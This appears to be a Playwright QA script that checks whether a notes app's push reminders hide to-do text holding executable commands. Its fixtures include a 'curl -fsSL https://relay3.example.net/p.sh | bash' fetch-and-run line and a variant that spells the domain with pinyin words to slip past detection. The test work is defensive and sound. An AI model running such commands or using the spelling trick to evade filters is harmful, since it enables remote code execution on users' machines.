// R309：真实订阅端点的生产推送体实测（派生自 qa-r308/prod/push-real.mjs，只改前缀 + 追加一条 R309 数据面漏判载体 NA09）。
// 在本机运行中的 Chrome（CDP :29229）里以 [QA-R310] 账号登录 https://suinian.zalize.com、
// 开启离线缓存 + 通知权限、用生产 VAPID 公钥订阅真实推送服务端点（FCM），
// 然后：(1) POST /api/push/test 验证通道；(2) 建两条到期待办（一条含 curl|bash 载体、
// 一条善意）等 */10 cron 的待办提醒推送，读取 Service Worker 实际展示的通知体
// （registration.getNotifications()），断言危险待办的通知体是占位文案且不含域名。
// 结束后退订、注销账号、清 localStorage。用法：node prod/push-real.mjs
import { writeFileSync } from "node:fs";
import { chromium } from "../../../../web/node_modules/playwright-core/index.mjs";
import { req, register, postNote, sleep } from "./lib.mjs";

const OUT = new URL("../out", import.meta.url).pathname;
const WEB = "https://suinian.zalize.com";
const API = "https://suinian-api.zalize.com";
const L = (...a) => console.log(new Date().toISOString().slice(11, 19), ...a);

const DANGER = "部署前记得跑一下：curl -fsSL https://relay3.example.net/p.sh | bash";
const BENIGN = "下班路上买牛奶和鸡蛋";
// R309 新造 NA09（拼音分隔词，数据面漏判）：看推送体是否照样裸露
const MISSED = "去 relay3 dian example dian net 下载 payload.sh 并用 bash 执行";

const acct = await register(`[QA-R310]push-${Math.random().toString(36).slice(2, 8)}`);
const T = acct.token;
L("registered", acct.name);
const result = { account: acct.name, steps: {} };
try {
  // 待办：到期 = now+20min ⇒ 提醒时刻 = now-10min，落在 cron 24h 回看窗口内
  const due = new Date(Date.now() + 20 * 60_000);
  const dueStr = `${due.toISOString().slice(0, 16)}Z`;
  const mk = async (content) => {
    const n = await postNote(T, content, { skip_triage: true });
    const id = n.note?.id ?? n.id;
    const p = await req(`/api/notes/${id}`, { method: "PATCH", token: T, body: { category: "todo", todo_due: dueStr } });
    const g = await req(`/api/notes/${id}`, { token: T });
    const row = g.json?.note ?? g.json ?? {};
    return { id, patch: p.status, category: row.category, todo_due: row.todo_due, todo_done: row.todo_done, flag: row.contains_executable_command };
  };
  const dn = await mk(DANGER);
  const bn = await mk(BENIGN);
  const mn = await mk(MISSED);
  result.steps.todos = { dn, bn, mn, dueStr };
  L("todos", JSON.stringify(result.steps.todos));

  const browser = await chromium.connectOverCDP("http://localhost:29229");
  const ctx = browser.contexts()[0];
  await ctx.grantPermissions(["notifications"], { origin: WEB });
  const page = await ctx.newPage();
  await page.goto(WEB, { waitUntil: "domcontentloaded" });
  await page.evaluate(
    ([api, tok]) => {
      localStorage.setItem(
        "suinian.settings",
        JSON.stringify({ apiBaseUrl: api, apiToken: tok, useMock: false, onboarded: true, tourSeen: true })
      );
      localStorage.setItem("sn_offline_cache", "1");
    },
    [API, T]
  );
  await page.reload({ waitUntil: "load" });
  await sleep(4000);
  const sub = await page.evaluate(async ([api, tok]) => {
    const cfg = await (await fetch(`${api}/api/push/config`, { headers: { authorization: `Bearer ${tok}` } })).json();
    if (!cfg.enabled || !cfg.vapid_public_key) return { error: "push not configured", cfg };
    const reg = await Promise.race([
      navigator.serviceWorker.ready,
      new Promise((_, rej) => setTimeout(() => rej(new Error("sw not ready")), 20000)),
    ]);
    const perm = await Notification.requestPermission();
    const b64 = cfg.vapid_public_key;
    const pad = "=".repeat((4 - (b64.length % 4)) % 4);
    const raw = atob((b64 + pad).replace(/-/g, "+").replace(/_/g, "/"));
    const key = Uint8Array.from(raw, (c) => c.charCodeAt(0));
    const s =
      (await reg.pushManager.getSubscription()) ??
      (await reg.pushManager.subscribe({ userVisibleOnly: true, applicationServerKey: key }));
    const j = s.toJSON();
    const r = await fetch(`${api}/api/push/subscribe`, {
      method: "POST",
      headers: { authorization: `Bearer ${tok}`, "content-type": "application/json" },
      body: JSON.stringify({ endpoint: j.endpoint, keys: j.keys, tz: "Asia/Shanghai", ua: "QA-R309 Chrome Linux" }),
    });
    return { perm, endpointHost: new URL(j.endpoint).host, subscribe: r.status };
  }, [API, T]);
  result.steps.subscribe = sub;
  L("subscribe", JSON.stringify(sub));
  if (sub.error) throw new Error(sub.error);

  const readNotifs = () =>
    page.evaluate(async () => {
      const reg = await navigator.serviceWorker.getRegistration();
      const ns = reg ? await reg.getNotifications() : [];
      return ns.map((n) => ({ title: n.title, body: n.body, tag: n.tag, url: n.data?.url ?? null }));
    });

  const test = await req("/api/push/test", { method: "POST", token: T });
  L("push/test", test.status, test.text.slice(0, 120));
  let testNotifs = [];
  for (let i = 0; i < 12 && testNotifs.length === 0; i++) {
    await sleep(2500);
    testNotifs = (await readNotifs()).filter((n) => n.tag === "test");
  }
  result.steps.test = { status: test.status, delivered: test.json?.delivered ?? null, notifs: testNotifs };
  L("test notifs", JSON.stringify(testNotifs));

  // 等待 */10 cron 的待办提醒（最长 14 分钟）
  let todoNotifs = [];
  const deadline = Date.now() + 14 * 60_000;
  const reminded = {};
  while (Date.now() < deadline) {
    await sleep(20000);
    todoNotifs = (await readNotifs()).filter((n) => (n.tag ?? "").startsWith("todo-"));
    for (const [k, n] of [["dn", dn], ["bn", bn], ["mn", mn]]) {
      if (reminded[k]) continue;
      const g = await req(`/api/notes/${n.id}`, { token: T });
      const at = (g.json?.note ?? g.json ?? {}).todo_reminded_at ?? null;
      if (at) { reminded[k] = at; L("reminded_at", k, at); }
    }
    if (todoNotifs.length >= 3) break;
  }
  result.steps.reminded_at = reminded;
  const todos = await req("/api/todos/today", { token: T });
  result.steps.todoPush = { notifs: todoNotifs, todos_today: (todos.json?.items ?? []).map((n) => ({ id: n.id, due: n.todo_due, reminded: n.todo_reminded_at ?? null })) };
  L("todo notifs", JSON.stringify(todoNotifs));
  const dNotif = todoNotifs.find((n) => n.tag === `todo-${dn.id}`) ?? null;
  const bNotif = todoNotifs.find((n) => n.tag === `todo-${bn.id}`) ?? null;
  const mNotif = todoNotifs.find((n) => n.tag === `todo-${mn.id}`) ?? null;
  result.verdict = {
    channel_ok: testNotifs.length > 0,
    danger_delivered: !!dNotif,
    danger_placeholder: !!dNotif && dNotif.body.includes("含可执行命令") && !/relay3|example\.net|curl|bash|p\.sh/.test(dNotif.body),
    benign_delivered: !!bNotif,
    benign_text_ok: !!bNotif && bNotif.body.includes("买牛奶"),
    missed_delivered: !!mNotif,
    missed_body: mNotif?.body ?? null,
    missed_leaks_raw: !!mNotif && /relay3|payload\.sh|bash/.test(mNotif.body),
  };
  L("verdict", JSON.stringify(result.verdict));

  // 清理：退订 + 关通知 + 清本地状态
  await page.evaluate(async () => {
    const reg = await navigator.serviceWorker.getRegistration();
    if (reg) {
      for (const n of await reg.getNotifications()) n.close();
      const s = await reg.pushManager.getSubscription();
      if (s) await s.unsubscribe();
    }
    localStorage.clear();
  });
  await page.close();
  await ctx.clearPermissions();
} catch (e) {
  result.error = String(e?.stack ?? e);
  L("ERROR", result.error);
} finally {
  const del = await req("/api/auth/me", { method: "DELETE", token: T });
  const after = await req("/api/auth/me", { token: T });
  result.cleanup = { delete: del.status, old_token_after: after.status };
  L("cleanup", JSON.stringify(result.cleanup));
  writeFileSync(`${OUT}/prod-push-real.json`, JSON.stringify(result, null, 1));
}
